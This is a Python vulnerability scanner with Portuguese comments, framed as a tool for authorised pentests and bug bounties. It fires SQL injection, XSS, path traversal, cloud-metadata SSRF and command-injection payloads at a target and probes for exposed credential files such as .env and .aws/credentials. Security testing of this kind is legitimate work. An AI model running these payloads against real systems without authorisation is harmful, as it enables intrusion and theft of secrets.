#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║                    🔮 OLHO MALIGNO - UNIFIED EDITION                       ║
║                                                                            ║
║         Scanner de Vulnerabilidades Web + Utilitários de Rede              ║
║                                                                            ║
║  ⚠️  APENAS AMBIENTES AUTORIZADOS - PENTEST | BUG BOUNTY | LABS           ║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝

FUNCIONALIDADES:
  ✅ Scanner completo: SQLi, XSS, LFI, IDOR, SSRF, RCE, Dados Sensíveis
  ✅ Reconnaissance: Enumeração de endpoints e subdomínios
  ✅ IP Lookup: Informações geográficas de IPs (utilitário)
  ✅ Relatórios: JSON, Markdown, HTML
  ✅ Single-file: Tudo em um arquivo, sem dependências externas

REMOVIDO (não ético/ilegal):
  ❌ DDoS / IP Bomb
  ❌ IP Logger / Malware
  ❌ Qualquer funcionalidade de ataque a terceiros sem autorização

USO:
  python olho_maligno.py scan https://alvo.com --proxy http://127.0.0.1:8080
  python olho_maligno.py lookup 8.8.8.8
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import logging
import os
import re
import socket
import subprocess
import sys
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse

try:
    import requests
except ImportError:
    print("[!] Instalando requests...")
    os.system(f"{sys.executable} -m pip install requests -q")
    import requests

try:
    from colorama import Fore, Style, init as colorama_init

    colorama_init(autoreset=True)
except ImportError:
    print("[!] Instalando colorama...")
    os.system(f"{sys.executable} -m pip install colorama -q")
    from colorama import Fore, Style, init as colorama_init

    colorama_init(autoreset=True)

# =============================================================================
# CONFIGURAÇÕES
# =============================================================================

__version__ = "7.0.0-UNIFIED"
__author__ = "Cybersecurity Student"

TAMANHO_MAXIMO_RESPOSTA = 5 * 1024 * 1024  # 5 MB
TIMEOUT_PADRAO = 10
MAX_RETRIES = 3
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("scan.log", encoding="utf-8"), logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("olho-maligno")


# =============================================================================
# MODELOS DE DADOS
# =============================================================================

class SeverityLevel(Enum):
    CRITICAL = ("CRÍTICA", Fore.RED + Style.BRIGHT, 9.8, "$5000+")
    HIGH = ("ALTA", Fore.RED, 8.5, "$1000+")
    MEDIUM = ("MÉDIA", Fore.YELLOW, 6.5, "$300+")
    LOW = ("BAIXA", Fore.GREEN, 4.0, "$100+")
    INFO = ("INFO", Fore.CYAN, 2.0, "N/A")


class VulnType(Enum):
    SQLI = "SQL Injection"
    XSS = "Cross-Site Scripting"
    LFI = "Local File Inclusion"
    IDOR = "Insecure Direct Object Reference"
    SSRF = "Server-Side Request Forgery"
    RCE = "Remote Code Execution"
    SENSITIVE_DATA = "Sensitive Data Exposure"
    INFO_DISCLOSURE = "Information Disclosure"
    CORS = "CORS Misconfiguration"
    OPEN_REDIRECT = "Open Redirect"


@dataclass
class Finding:
    """Vulnerabilidade encontrada durante o scan."""
    title: str
    severity: SeverityLevel
    vuln_type: VulnType
    url: str
    parameter: Optional[str] = None
    payload: Optional[str] = None
    evidence: str = ""
    remediation: str = ""
    cvss: float = 0.0
    bounty: str = "N/A"
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        return {
            "title": self.title,
            "severity": self.severity.name,
            "type": self.vuln_type.value,
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence,
            "remediation": self.remediation,
            "cvss": self.cvss,
            "bounty": self.bounty,
            "timestamp": self.timestamp,
        }


# =============================================================================
# CLIENTE HTTP
# =============================================================================

class HTTPClient:
    """Cliente HTTP com retry, timeout e controle de rate limit."""
    
    def __init__(self, timeout: int = TIMEOUT_PADRAO, proxy: Optional[str] = None, delay: float = 0.5):
        self.timeout = timeout
        self.proxy = proxy
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENTS[0], "Accept": "*/*"})
        
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
    
    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Faz requisição com retry e backoff exponencial."""
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("verify", False)
        kwargs.setdefault("allow_redirects", False)
        
        for attempt in range(MAX_RETRIES):
            try:
                time.sleep(self.delay)
                resp = self.session.request(method, url, **kwargs)
                return resp
            except requests.RequestException as e:
                logger.debug("Tentativa %d falhou: %s", attempt + 1, e)
                if attempt < MAX_RETRIES - 1:
                    time.sleep(2 ** attempt)
        return None
    
    def get(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request("GET", url, **kwargs)
    
    def post(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request("POST", url, **kwargs)


# =============================================================================
# PAYLOADS
# =============================================================================

PAYLOADS_SQLI = {
    "time": ["' AND SLEEP(5)--", "' AND BENCHMARK(5000000,MD5(1))--", "'; WAITFOR DELAY '00:00:05'--"],
    "error": [
        "' AND extractvalue(1,concat(0x7e,(select version())))--",
        "' AND updatexml(1,concat(0x7e,(select database())),0)--",
    ],
    "union": [
        "' UNION SELECT NULL,NULL,NULL,database(),user(),version()--",
        "' UNION SELECT table_name,column_name,NULL,NULL FROM information_schema.columns--",
    ],
}

PAYLOADS_XSS = [
    '"><script>alert(1)</script>',
    '"><img src=x onerror="alert(1)">',
    '"><svg onload="alert(1)">',
    "'-alert(1)-'",
]

PAYLOADS_LFI = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

PAYLOADS_SSRF = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "file:///etc/passwd",
]

ARQUIVOS_SENSIVEIS = [
    "/.env",
    "/.env.local",
    "/.git/config",
    "/.aws/credentials",
    "/config.php",
    "/database.yml",
    "/secrets.json",
    "/backup.sql",
    "/.htaccess",
    "/robots.txt",
    "/sitemap.xml",
    "/crossdomain.xml",
]

ENDPOINTS_COMUNS = [
    "/admin",
    "/login",
    "/api",
    "/api/v1",
    "/graphql",
    "/upload",
    "/debug",
    "/test",
    "/health",
    "/swagger",
    "/.env",
]


# =============================================================================
# DETECTORES
# =============================================================================

class BaseDetector:
    def __init__(self, client: HTTPClient):
        self.client = client
        self.findings: List[Finding] = []
    
    def add_finding(self, **kwargs) -> None:
        self.findings.append(Finding(**kwargs))


class SQLiDetector(BaseDetector):
    def scan(self, url: str, params: List[str]) -> List[Finding]:
        for param in params:
            # Time-based
            for payload in PAYLOADS_SQLI["time"]:
                start = time.time()
                resp = self.client.get(url, params={param: payload})
                elapsed = time.time() - start
                
                if elapsed > 4:
                    self.add_finding(
                        title="SQL Injection (Time-Based Blind)",
                        severity=SeverityLevel.CRITICAL,
                        vuln_type=VulnType.SQLI,
                        url=f"{url}?{param}=",
                        parameter=param,
                        payload=payload,
                        evidence=f"Delay de {elapsed:.2f}s detectado",
                        remediation="Use prepared statements / parameterized queries",
                        cvss=9.8,
                        bounty="$3000+",
                    )
                    break  # Evita múltiplos findings do mesmo parâmetro
            
            # Error-based
            for payload in PAYLOADS_SQLI["error"]:
                resp = self.client.get(url, params={param: payload})
                if resp and any(k in resp.text.upper() for k in ["SQL", "MYSQL", "SYNTAX", "ERROR"]):
                    self.add_finding(
                        title="SQL Injection (Error-Based)",
                        severity=SeverityLevel.CRITICAL,
                        vuln_type=VulnType.SQLI,
                        url=f"{url}?{param}=",
                        parameter=param,
                        payload=payload,
                        evidence="Mensagem de erro SQL exposta na resposta",
                        remediation="Implemente tratamento de erro genérico e prepared statements",
                        cvss=9.8,
                        bounty="$3000+",
                    )
                    break
        return self.findings


class XSSDetector(BaseDetector):
    def scan(self, url: str, params: List[str]) -> List[Finding]:
        for param in params:
            marker = f"XSS_TEST_{int(time.time())}"
            resp = self.client.get(url, params={param: marker})
            
            if resp and marker in resp.text:
                self.add_finding(
                    title="Cross-Site Scripting (XSS) Refletido",
                    severity=SeverityLevel.HIGH,
                    vuln_type=VulnType.XSS,
                    url=f"{url}?{param}={marker}",
                    parameter=param,
                    payload=marker,
                    evidence="Input refletido sem sanitização HTML",
                    remediation="Implemente HTML encoding (ex: &lt; para <) e Content-Security-Policy",
                    cvss=6.1,
                    bounty="$500+",
                )
        return self.findings


class LFIDetector(BaseDetector):
    def scan(self, url: str, params: List[str]) -> List[Finding]:
        for param in params:
            for payload in PAYLOADS_LFI[:4]:
                resp = self.client.get(url, params={param: payload})
                if resp and ("root:" in resp.text or "/bin/" in resp.text):
                    self.add_finding(
                        title="Local File Inclusion (LFI)",
                        severity=SeverityLevel.HIGH,
                        vuln_type=VulnType.LFI,
                        url=f"{url}?{param}=",
                        parameter=param,
                        payload=payload,
                        evidence="Conteúdo de /etc/passwd acessível",
                        remediation="Whitelist de arquivos permitidos; nunca use user input em paths",
                        cvss=7.5,
                        bounty="$1500+",
                    )
                    break
        return self.findings


class IDORDetector(BaseDetector):
    def scan(self, url: str, params: List[str]) -> List[Finding]:
        for param in params:
            respostas = {}
            for test_id in ["1", "2", "3"]:
                resp = self.client.get(url, params={param: test_id})
                if resp:
                    respostas[test_id] = resp.text[:500]
            
            if len(set(respostas.values())) > 1:
                self.add_finding(
                    title="Insecure Direct Object Reference (IDOR)",
                    severity=SeverityLevel.HIGH,
                    vuln_type=VulnType.IDOR,
                    url=f"{url}?{param}=",
                    parameter=param,
                    evidence="IDs diferentes retornam conteúdos diferentes sem validação de autorização",
                    remediation="Valide se o usuário logado tem permissão para acessar o recurso solicitado",
                    cvss=7.5,
                    bounty="$1000+",
                )
        return self.findings


class SSRFDetector(BaseDetector):
    def scan(self, url: str, params: List[str]) -> List[Finding]:
        for param in params:
            for payload in PAYLOADS_SSRF:
                resp = self.client.get(url, params={param: payload})
                if resp and resp.status_code == 200:
                    # Verifica se parece metadata ou serviço interno
                    if any(ind in resp.text for ind in ["ami-id", "instance-id", "computeMetadata", "root:"]):
                        self.add_finding(
                            title="Server-Side Request Forgery (SSRF)",
                            severity=SeverityLevel.HIGH,
                            vuln_type=VulnType.SSRF,
                            url=f"{url}?{param}=",
                            parameter=param,
                            payload=payload,
                            evidence="Acesso a recursos internos/cloud metadata confirmado",
                            remediation="Valide e restrinja URLs permitidas; use whitelist",
                            cvss=8.5,
                            bounty="$2000+",
                        )
                        break
        return self.findings


class SensitiveDataDetector(BaseDetector):
    def scan(self, base_url: str) -> List[Finding]:
        for endpoint in ARQUIVOS_SENSIVEIS:
            test_url = urljoin(base_url, endpoint)
            resp = self.client.get(test_url)
            
            if resp and resp.status_code == 200:
                severity = SeverityLevel.CRITICAL if endpoint in ["/.env", "/.aws/credentials"] else SeverityLevel.HIGH
                
                evidence = f"Arquivo acessível ({len(resp.text)} bytes)"
                if "KEY" in resp.text or "PASSWORD" in resp.text or "SECRET" in resp.text:
                    evidence += " - possíveis credenciais expostas!"
                
                self.add_finding(
                    title=f"Arquivo Sensível Exposto: {endpoint}",
                    severity=severity,
                    vuln_type=VulnType.SENSITIVE_DATA,
                    url=test_url,
                    evidence=evidence,
                    remediation="Restrinja acesso via configuração do web server (nginx/apache)",
                    cvss=9.0 if severity == SeverityLevel.CRITICAL else 7.5,
                    bounty="$2000+" if severity == SeverityLevel.CRITICAL else "$500+",
                )
        return self.findings


class RCEDetector(BaseDetector):
    def scan(self, url: str, params: List[str]) -> List[Finding]:
        indicadores_rce = ["uid=", "gid=", "root:x:", "command not found", "drwx"]
        
        for param in params:
            for payload in ['"; id; "', "| id", "& id &", "`id`", "$(id)"]:
                resp = self.client.get(url, params={param: payload})
                if resp and any(ind in resp.text.lower() for ind in indicadores_rce):
                    self.add_finding(
                        title="Remote Code Execution (Command Injection)",
                        severity=SeverityLevel.CRITICAL,
                        vuln_type=VulnType.RCE,
                        url=f"{url}?{param}=",
                        parameter=param,
                        payload=payload,
                        evidence="Output de comando do sistema operacional detectado",
                        remediation="NUNCA passe input do usuário diretamente para funções de execução; use whitelist",
                        cvss=9.8,
                        bounty="$5000+",
                    )
                    break
        return self.findings


# =============================================================================
# RECONHECIMENTO
# =============================================================================

class ReconEngine:
    def __init__(self, client: HTTPClient):
        self.client = client
    
    def enumerate_endpoints(self, base_url: str) -> List[str]:
        """Enumera endpoints comuns e retorna os que respondem."""
        found = []
        print(f"\n{Fore.CYAN}[*] Iniciando reconnaissance em {base_url}{Style.RESET_ALL}")
        
        for endpoint in ENDPOINTS_COMUNS:
            test_url = urljoin(base_url, endpoint)
            resp = self.client.get(test_url)
            
            if resp and resp.status_code < 404:
                found.append(test_url)
                print(f"  {Fore.GREEN}[+] {endpoint} -> {resp.status_code}{Style.RESET_ALL}")
            else:
                print(f"  {Fore.BLACK}[-] {endpoint} -> Não encontrado{Style.RESET_ALL}")
        
        return found
    
    def discover_parameters(self, url: str) -> List[str]:
        """Descobre parâmetros comuns para teste."""
        return ["id", "user_id", "product_id", "file", "page", "url", "path", "q", "search", "cmd"]


# =============================================================================
# SCANNER PRINCIPAL
# =============================================================================

class Scanner:
    def __init__(self, target: str, proxy: Optional[str] = None, delay: float = 0.5):
        self.target = target.rstrip("/")
        self.client = HTTPClient(proxy=proxy, delay=delay)
        self.findings: List[Finding] = []
        self.recon = ReconEngine(self.client)
    
    def run(self) -> List[Finding]:
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  🔮 OLHO MALIGNO v{__version__}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Alvo: {self.target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        # 1. Recon
        endpoints = self.recon.enumerate_endpoints(self.target)
        params = self.recon.discover_parameters(self.target)
        
        # 2. Scan de vulnerabilidades
        detectors = [
            ("Sensitive Data", SensitiveDataDetector(self.client)),
            ("SQL Injection", SQLiDetector(self.client)),
            ("XSS", XSSDetector(self.client)),
            ("LFI", LFIDetector(self.client)),
            ("IDOR", IDORDetector(self.client)),
            ("SSRF", SSRFDetector(self.client)),
            ("RCE", RCEDetector(self.client)),
        ]
        
        for name, detector in detectors:
            print(f"\n{Fore.YELLOW}[*] Scanning: {name}{Style.RESET_ALL}")
            try:
                if isinstance(detector, SensitiveDataDetector):
                    detector.scan(self.target)
                else:
                    detector.scan(self.target, params)
                self.findings.extend(detector.findings)
                print(f"  {Fore.GREEN}  -> {len(detector.findings)} findings{Style.RESET_ALL}")
            except Exception as e:
                print(f"  {Fore.RED}  -> Erro: {e}{Style.RESET_ALL}")
        
        return self.findings
    
    def print_results(self):
        if not self.findings:
            print(f"\n{Fore.GREEN}[+] Nenhuma vulnerabilidade detectada.{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.RED}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.RED}  VULNERABILIDADES ENCONTRADAS: {len(self.findings)}{Style.RESET_ALL}")
        print(f"{Fore.RED}{'═'*70}{Style.RESET_ALL}\n")
        
        # Agrupa por severidade
        by_sev = {}
        for f in self.findings:
            by_sev.setdefault(f.severity.name, []).append(f)
        
        for sev_name in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            items = by_sev.get(sev_name, [])
            if not items:
                continue
            
            color = items[0].severity.value[1]
            print(f"{color}[{items[0].severity.value[0]}] {len(items)} vulnerabilidade(s){Style.RESET_ALL}\n")
            
            for i, finding in enumerate(items, 1):
                print(f"  {i}. {finding.title}")
                print(f"     URL: {finding.url}")
                if finding.parameter:
                    print(f"     Parâmetro: {finding.parameter}")
                print(f"     Evidência: {finding.evidence[:100]}")
                print(f"     CVSS: {finding.cvss} | Bounty: {finding.bounty}")
                print()
    
    def generate_report(self, fmt: str = "json", filename: str = "relatorio"):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        data = {
            "scanner": "Olho Maligno",
            "version": __version__,
            "target": self.target,
            "timestamp": timestamp,
            "total_findings": len(self.findings),
            "findings": [f.to_dict() for f in self.findings],
        }
        
        if fmt == "json":
            filepath = f"{filename}_{timestamp}.json"
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            print(f"\n{Fore.GREEN}[+] Relatório JSON: {filepath}{Style.RESET_ALL}")
        
        elif fmt == "md":
            filepath = f"{filename}_{timestamp}.md"
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(f"# Relatório de Vulnerabilidades\n\n")
                f.write(f"**Alvo:** {self.target}\n")
                f.write(f"**Data:** {timestamp}\n")
                f.write(f"**Total:** {len(self.findings)}\n\n")
                
                for finding in self.findings:
                    f.write(f"## {finding.title}\n")
                    f.write(f"- **Severidade:** {finding.severity.name}\n")
                    f.write(f"- **Tipo:** {finding.vuln_type.value}\n")
                    f.write(f"- **URL:** `{finding.url}`\n")
                    f.write(f"- **CVSS:** {finding.cvss}\n")
                    f.write(f"- **Remediação:** {finding.remediation}\n\n")
            
            print(f"\n{Fore.GREEN}[+] Relatório Markdown: {filepath}{Style.RESET_ALL}")
        
        elif fmt == "html":
            filepath = f"{filename}_{timestamp}.html"
            with open(filepath, "w", encoding="utf-8") as f:
                f.write("""<html><head><meta charset="utf-8">
                <style>
                body{font-family:Arial,sans-serif;max-width:900px;margin:40px auto;padding:20px}
                h1{color:#d32f2f} h2{color:#f57c00} .critical{color:#d32f2f}
                .high{color:#f57c00} .medium{color:#fbc02d} .low{color:#388e3c}
                table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:12px;text-align:left}
                th{background:#f5f5f5}
                </style></head><body>""")
                f.write(f"<h1>🔮 Relatório Olho Maligno</h1>")
                f.write(f"<p><b>Alvo:</b> {self.target}<br><b>Data:</b> {timestamp}</p>")
                f.write(f"<h2>Resumo: {len(self.findings)} findings</h2><table>")
                f.write("<tr><th>Severidade</th><th>Título</th><th>URL</th><th>CVSS</th></tr>")
                
                for finding in self.findings:
                    css_class = finding.severity.name.lower()
                    f.write(f'<tr class="{css_class}">')
                    f.write(f"<td>{finding.severity.name}</td>")
                    f.write(f"<td>{finding.title}</td>")
                    f.write(f"<td>{finding.url}</td>")
                    f.write(f"<td>{finding.cvss}</td></tr>")
                
                f.write("</table></body></html>")
            
            print(f"\n{Fore.GREEN}[+] Relatório HTML: {filepath}{Style.RESET_ALL}")


# =============================================================================
# IP LOOKUP (UTILITÁRIO LEGÍTIMO)
# =============================================================================

def ip_lookup(ip_address: str):
    """Obtém informações geográficas de um IP via API pública."""
    print(f"\n{Fore.CYAN}[*] Consultando IP: {ip_address}{Style.RESET_ALL}")
    
    try:
        resp = requests.get(f"https://ipinfo.io/{ip_address}/json", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            print(f"\n{Fore.GREEN}  Resultado:{Style.RESET_ALL}")
            print(f"  {'─'*40}")
            print(f"  IP:        {data.get('ip', 'N/A')}")
            print(f"  Cidade:    {data.get('city', 'N/A')}")
            print(f"  Região:    {data.get('region', 'N/A')}")
            print(f"  País:      {data.get('country', 'N/A')}")
            print(f"  Loc:       {data.get('loc', 'N/A')}")
            print(f"  Org:       {data.get('org', 'N/A')}")
            print(f"  Hostname:  {data.get('hostname', 'N/A')}")
            print(f"  {'─'*40}\n")
        else:
            print(f"{Fore.RED}[!] Erro na API: {resp.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")


# =============================================================================
# CLI
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="🔮 Olho Maligno - Scanner de Vulnerabilidades Web",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXEMPLOS:
  Scan básico:           python olho_maligno.py scan https://alvo.com
  Scan com proxy:        python olho_maligno.py scan https://alvo.com --proxy http://127.0.0.1:8080
  Scan lento (safe):     python olho_maligno.py scan https://alvo.com --delay 2
  Relatório HTML:        python olho_maligno.py scan https://alvo.com --format html
  IP Lookup:             python olho_maligno.py lookup 8.8.8.8
        """,
    )
    
    subparsers = parser.add_subparsers(dest="command", required=True, help="Comando")
    
    # --- SCAN ---
    scan_parser = subparsers.add_parser("scan", help="Executar scanner de vulnerabilidades")
    scan_parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    scan_parser.add_argument("--proxy", "-p", help="Proxy (ex: http://127.0.0.1:8080)")
    scan_parser.add_argument("--delay", "-d", type=float, default=0.5, help="Delay entre requisições (segundos)")
    scan_parser.add_argument("--format", "-f", choices=["json", "md", "html"], default="json", help="Formato do relatório")
    scan_parser.add_argument("--output", "-o", default="relatorio", help="Nome base do arquivo de saída")
    
    # --- LOOKUP ---
    lookup_parser = subparsers.add_parser("lookup", help="Consultar informações de um IP")
    lookup_parser.add_argument("ip", help="Endereço IP (ex: 8.8.8.8)")
    
    args = parser.parse_args()
    
    if args.command == "scan":
        scanner = Scanner(target=args.url, proxy=args.proxy, delay=args.delay)
        findings = scanner.run()
        scanner.print_results()
        scanner.generate_report(fmt=args.format, filename=args.output)
        return 0 if not any(f.severity == SeverityLevel.CRITICAL for f in findings) else 1
    
    elif args.command == "lookup":
        ip_lookup(args.ip)
        return 0
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
